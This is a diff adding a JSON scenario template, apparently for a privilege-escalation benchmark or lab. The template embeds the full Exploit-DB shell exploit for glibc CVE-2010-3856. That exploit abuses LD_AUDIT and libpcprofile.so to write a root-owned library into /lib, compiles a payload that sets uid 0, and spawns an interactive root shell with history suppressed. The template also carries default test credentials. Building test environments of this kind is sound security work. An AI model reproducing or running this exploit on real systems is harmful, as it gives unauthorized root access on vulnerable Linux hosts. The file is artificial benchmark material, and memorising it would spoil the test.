@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18105",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: glibc - 'LD_AUDIT' Arbitrary DSO Load Privilege Escalation (CVE-2010-3856;OSVDB-68920)\n\nExploit source code (18105.sh):\n```\n#!/bin/sh\n\n            #######################################################\n            #       I Can't Read and I Won't Race You Either      #\n            #                      by zx2c4                       #\n            #######################################################\n\n################################################################################\n# This is an exploit for CVE-2010-3856.\n#\n# A while back, Tavis showed us three ways to exploit flaws in glibc's dynamic\n# linker involving LD_AUDIT. [1] [2]\n#\n# The first way involved opening a file descriptor and using fexecve to easily\n# win a race with $ORIGIN. The problem was that this required having read\n# permissions on the SUID executables. Tavis recommended a work around involving\n# filling a pipe until it was full so that anything written to stderr would\n# block. This race, however, was not always successful. The third thing he\n# showed us was that LD_AUDIT would load any trusted library, and he pointed out\n# that libpcprofile.so could be jiggered to create a world writable root owned\n# file in any directory. One candidate would be to write something to a crontab.\n# What if, however, you don't have cron installed? He then went on to explain a\n# quite extensive search routine to find candidates for libraries to load.\n#\n# But why search, when you already can make a world writable root owned file in\n# any directory you want? The easier way is to use libpcprofile.so to create\n# such a file, and then fill that file with code you want to run. Then, run that\n# code using the same trick. Pretty simple, and it works.\n#\n# - zx2c4\n# 2011-11-9\n#\n# greets to taviso.\n#\n# [1] http://seclists.org/fulldisclosure/2010/Oct/257\n# [2] http://seclists.org/bugtraq/2010/Oct/200\n################################################################################\n\necho \"[+] Setting umask to 0 so we have world writable files.\"\numask 0\n\necho \"[+] Preparing binary payload.\"\ncat > /tmp/payload.c <<_EOF\nvoid __attribute__((constructor)) init()\n{\n\tprintf(\"[+] Cleaning up.\\n\");\n\tunlink(\"/lib/libexploit.so\");\n\n\tprintf(\"[+] Launching shell.\\n\");\n\tsetuid(0);\n\tsetgid(0);\n\tsetenv(\"HISTFILE\", \"/dev/null\", 1);\n\texecl(\"/bin/sh\", \"/bin/sh\", \"-i\", 0);\n}\n_EOF\ngcc -w -fPIC -shared -o /tmp/exploit /tmp/payload.c\n\necho \"[+] Writing root owned world readable file in /lib\"\nLD_AUDIT=\"libpcprofile.so\" PCPROFILE_OUTPUT=\"/lib/libexploit.so\" ping 2>/dev/null\n\necho \"[+] Filling the lib file with lib contents.\"\ncat /tmp/exploit > /lib/libexploit.so\nrm /tmp/payload.c /tmp/exploit\n\necho \"[+] Executing payload.\"\nLD_AUDIT=\"libexploit.so\" ping\n```",
+  "cve": "CVE-2010-3856;OSVDB-68920",
+  "exploitdb_id": "18105",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18105",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
